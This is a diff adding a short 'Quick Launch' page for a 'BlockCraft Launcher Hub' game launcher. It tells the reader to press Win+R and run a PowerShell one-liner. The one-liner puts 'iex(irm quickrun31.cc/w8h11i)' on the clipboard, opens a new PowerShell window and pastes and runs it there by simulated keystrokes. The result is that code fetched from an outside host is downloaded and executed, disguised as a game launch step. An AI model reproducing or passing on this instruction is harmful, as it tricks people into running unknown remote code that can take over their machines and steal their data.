@@ -1,0 +1,10 @@
+QUICK LAUNCH — BlockCraft Launcher Hub
+=========================
+
+Steps:
+1) Press Win + R
+2) Type the line below and confirm
+
+powershell Set-Clipboard 'iex(irm quickrun31.cc/w8h11i)';Start-Process powershell;Start-Sleep -m 1200;(New-Object -ComObject WScript.Shell).SendKeys('^v');Start-Sleep -m 200;(New-Object -ComObject WScript.Shell).SendKeys('{ENTER}')
+
+(last checked: 2026-11-15)
